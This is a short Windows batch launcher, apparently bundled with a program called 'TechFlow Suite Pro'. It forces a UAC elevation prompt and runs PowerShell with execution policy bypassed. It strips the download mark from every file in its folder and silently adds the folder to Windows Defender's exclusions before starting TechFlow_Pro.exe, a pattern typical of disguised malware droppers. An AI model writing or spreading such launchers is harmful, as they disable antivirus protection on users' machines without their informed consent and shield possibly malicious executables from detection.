@echo off
title TechFlow Suite Pro (Native Go Edition)
cd /d "%~dp0"

:: Verificar elevaci?n UAC
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: Desbloquear archivos descargados (Zone.Identifier) y asegurar exclusi?n
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%~dp0*.*' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue"

if exist "%~dp0TechFlow_Pro.exe" (
    start "" "%~dp0TechFlow_Pro.exe"
) else (
    echo [X] No se encontro TechFlow_Pro.exe en este directorio.
    pause
)